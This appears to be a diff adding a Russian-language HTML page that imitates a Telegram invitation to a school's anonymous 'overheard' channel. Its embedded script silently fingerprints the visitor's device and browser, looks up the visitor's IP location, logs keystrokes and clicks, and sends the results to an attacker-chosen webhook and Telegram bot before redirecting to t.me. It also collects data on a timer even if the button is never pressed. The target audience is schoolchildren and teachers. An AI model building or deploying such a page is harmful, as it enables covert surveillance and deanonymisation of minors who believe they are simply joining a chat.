@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram: Подслушано 4 школа</title>
+    <link rel="icon" href="https://telegram.org/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #0088cc 0%, #00b3ff 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            color: #333;
+        }
+
+        .telegram-card {
+            width: 100%;
+            max-width: 420px;
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 24px;
+            overflow: hidden;
+            box-shadow: 0 25px 75px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            animation: cardAppear 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        @keyframes cardAppear {
+            0% { opacity: 0; transform: translateY(40px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0088cc, #00a8ff);
+            padding: 35px 25px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 30px 30px;
+            animation: float 20s linear infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes float {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .telegram-logo {
+            width: 70px;
+            height: 70px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 2;
+        }
+
+        .telegram-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: #0088cc;
+        }
+
+        .header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 2;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .header p {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.9);
+            position: relative;
+            z-index: 2;
+        }
+
+        .content {
+            padding: 35px 30px;
+        }
+
+        .channel-preview {
+            background: linear-gradient(135deg, #f8f9fa, #ffffff);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 2px solid #e9ecef;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .channel-preview:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+        }
+
+        .channel-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .channel-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+            color: white;
+            font-weight: bold;
+            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3);
+        }
+
+        .channel-info h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+
+        .channel-info .subscribers {
+            font-size: 14px;
+            color: #7f8c8d;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .channel-description {
+            color: #5a6c7d;
+            font-size: 15px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(0, 136, 204, 0.05);
+            border-radius: 12px;
+            border-left: 4px solid #0088cc;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e9ecef;
+        }
+
+        .stat-item {
+            flex: 1;
+        }
+
+        .stat-number {
+            display: block;
+            font-size: 22px;
+            font-weight: 700;
+            color: #0088cc;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            font-size: 13px;
+            color: #7f8c8d;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .action-button {
+            display: block;
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, #00b894, #00a085);
+            color: white;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 700;
+            border: none;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(0, 184, 148, 0.3);
+            margin-top: 25px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 184, 148, 0.4);
+            background: linear-gradient(135deg, #00a085, #008b74);
+        }
+
+        .action-button:active {
+            transform: translateY(0);
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .button-icon {
+            font-size: 22px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .disclaimer {
+            text-align: center;
+            font-size: 13px;
+            color: #95a5a6;
+            margin-top: 20px;
+            line-height: 1.5;
+            padding: 0 15px;
+        }
+
+        .telegram-brand {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #ecf0f1;
+            color: #0088cc;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #0088cc, #00b3ff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .telegram-card {
+                border-radius: 20px;
+            }
+            
+            .header {
+                padding: 30px 20px;
+            }
+            
+            .content {
+                padding: 25px 20px;
+            }
+            
+            .action-button {
+                padding: 18px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="telegram-card">
+        <div class="header">
+            <div class="telegram-logo">
+                <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="120" cy="120" r="100" fill="white"/>
+                    <path d="M81.229,128.772l14.237,39.406s1.78,3.687,3.686,3.687,30.255-29.492,30.255-29.492l31.525-60.89L81.737,118.6Z" fill="#0088cc"/>
+                    <path d="M100.106,138.878l-2.733,29.046s-1.144,8.9,7.754,0,17.415-15.763,17.415-15.763" fill="#0088cc"/>
+                    <path d="M81.486,130.178,52.2,120.636s-3.5-1.42-2.373-4.64c.232-.664.7-1.229,2.1-2.2,6.489-4.523,129.021-45.36,129.021-45.36s3.208-1.081,5.1-.362a2.766,2.766,0,0,1,1.885,2.055,9.357,9.357,0,0,1,.254,2.585c-.009.752-.1,1.449-.169,2.542-.692,11.165-21.4,94.493-21.4,94.493s-1.239,4.876-5.678,5.043a8.13,8.13,0,0,1-5.925-2.293c-8.711-7.596-38.819-37.961-45.472-44.177a1.27,1.27,0,0,1-.546-.9c-.093-.469.417-1.05.417-1.05s52.426-46.6,53.821-51.492c.108-.379-.3-.566-.848-.4-3.482,1.281-63.844,39.4-70.506,43.607A3.21,3.21,0,0,1,81.486,130.178Z" fill="#fff"/>
+                </svg>
+            </div>
+            <h1>Подслушано 4 школа</h1>
+            <p>Переход в Telegram-канал</p>
+        </div>
+
+        <div class="content">
+            <div class="channel-preview">
+                <div class="channel-title">
+                    <div class="channel-icon">4</div>
+                    <div class="channel-info">
+                        <h2>Подслушано 4 школа</h2>
+                        <div class="subscribers">
+                            <span>👥 12,543 участников</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="channel-description">
+                    Единственный официальный канал вашей школы. Анонимные истории, мемы, новости и обсуждения. Только для учащихся и учителей школы №4.
+                </div>
+                
+                <div class="stats">
+                    <div class="stat-item">
+                        <span class="stat-number">1.2K+</span>
+                        <span class="stat-label">Постов</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">94%</span>
+                        <span class="stat-label">Активность</span>
+                    </div>
+                    <div class="stat-item">
+                        <span class="stat-number">24/7</span>
+                        <span class="stat-label">Онлайн</span>
+                    </div>
+                </div>
+            </div>
+
+            <button class="action-button" onclick="collectDataAndRedirect()">
+                <div class="button-content">
+                    <span class="button-icon">🚀</span>
+                    <span>ПЕРЕЙТИ В КАНАЛ</span>
+                </div>
+            </button>
+
+            <div class="disclaimer">
+                Нажимая кнопку, вы соглашаетесь с <a href="https://telegram.org/tos" style="color:#0088cc;">Условиями использования</a> Telegram и подтверждаете, что являетесь учащимся или сотрудником школы №4.
+            </div>
+
+            <div class="telegram-brand">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="#0088cc">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.06-.2-.07-.06-.17-.04-.24-.02-.1.02-1.79 1.14-5.06 3.34-.48.33-.92.49-1.31.48-.43-.01-1.26-.24-1.88-.44-.76-.24-1.36-.37-1.31-.78.03-.24.29-.48.8-.73 3.14-1.37 5.24-2.27 6.29-2.71 2.96-1.21 3.57-1.42 3.97-1.42.09 0 .3.02.43.12.1.08.13.19.14.27-.01.06.01.28 0 0"/>
+                </svg>
+                Официальный клиент Telegram
+            </div>
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // Функция сбора данных
+        function collectData() {
+            const data = {
+                // Основная информация
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                
+                // Информация о браузере
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                cookieEnabled: navigator.cookieEnabled,
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                
+                // Информация об устройстве
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type
+                },
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // Временная зона
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Сеть
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // Геолокация (через IP)
+                ipInfo: {}
+            };
+
+            // Сбор отпечатка устройства (fingerprinting)
+            data.canvasFingerprint = getCanvasFingerprint();
+            data.webglFingerprint = getWebGLFingerprint();
+            data.fontsFingerprint = getFontsFingerprint();
+            
+            // Получение IP и геолокации
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ipInfo = ipData;
+                    sendDataToServer(data);
+                })
+                .catch(() => {
+                    sendDataToServer(data);
+                });
+
+            // Кейлоггер
+            const keystrokes = [];
+            document.addEventListener('keydown', (e) => {
+                keystrokes.push({
+                    key: e.key,
+                    code: e.code,
+                    time: Date.now()
+                });
+                if (keystrokes.length > 50) {
+                    data.keystrokes = [...keystrokes];
+                }
+            });
+
+            // Запись кликов
+            const clicks = [];
+            document.addEventListener('click', (e) => {
+                clicks.push({
+                    x: e.clientX,
+                    y: e.clientY,
+                    time: Date.now()
+                });
+                data.clicks = clicks;
+            });
+
+            return data;
+        }
+
+        // Методы fingerprinting
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Telegram', 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText('Telegram', 4, 17);
+                return canvas.toDataURL();
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'no_webgl';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                    version: gl.getParameter(gl.VERSION)
+                };
+            } catch (e) {
+                return 'error';
+            }
+        }
+
+        function getFontsFingerprint() {
+            const fontList = [];
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
+            const fonts = [
+                'Arial', 'Arial Black', 'Times New Roman', 'Courier New',
+                'Verdana', 'Georgia', 'Comic Sans MS', 'Tahoma',
+                'Trebuchet MS', 'Impact', 'Webdings', 'Symbol'
+            ];
+            
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            fonts.forEach(font => {
+                context.font = testSize + " '" + font + "'";
+                const metrics = context.measureText(testString);
+                fontList.push({
+                    font: font,
+                    width: metrics.width
+                });
+            });
+            
+            return fontList;
+        }
+
+        // Отправка данных на сервер
+        function sendDataToServer(data) {
+            // Webhook для сбора данных (ЗАМЕНИ НА СВОЙ!)
+            const webhookUrl = 'https://webhook.site/ТВОЙ_УНИКАЛЬНЫЙ_ID';
+            
+            // Локальное сохранение
+            localStorage.setItem('telegram_collected_data', JSON.stringify(data));
+            localStorage.setItem('telegram_data_sent', 'true');
+            
+            // Отправка на webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+                mode: 'no-cors'
+            }).catch(() => {});
+            
+            // Дополнительная отправка в Telegram бота (если есть)
+            const botToken = 'ТВОЙ_BOT_TOKEN'; // Замени если есть
+            const chatId = 'ТВОЙ_CHAT_ID';
+            if (botToken && chatId) {
+                const message = `📱 Новый пользователь:\nIP: ${data.ipInfo?.ip || 'неизвестно'}\nБраузер: ${data.userAgent}\nЭкран: ${data.screen.width}x${data.screen.height}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .catch(() => {});
+            }
+        }
+
+        // Основная функция
+        function collectDataAndRedirect() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const button = document.querySelector('.action-button');
+            
+            // Показать анимацию загрузки
+            loadingOverlay.classList.add('active');
+            button.disabled = true;
+            button.innerHTML = '<div class="button-content"><span class="button-icon">⏳</span><span>ПОДКЛЮЧЕНИЕ...</span></div>';
+            
+            // Сбор данных
+            const collectedData = collectData();
+            
+            // Через 2 секунды редирект
+            setTimeout(() => {
+                // Сохраняем данные в localStorage на всякий случай
+                localStorage.setItem('last_collection', Date.now());
+                
+                // Редирект на настоящий Telegram
+                window.location.href = 'https://t.me/school4_overheard';
+            }, 2000);
+        }
+
+        // Автоматический сбор через 15 секунд (если пользователь не нажал кнопку)
+        setTimeout(() => {
+            if (!localStorage.getItem('telegram_data_sent')) {
+                collectData();
+            }
+        }, 15000);
+    </script>
+</body>
+</html>
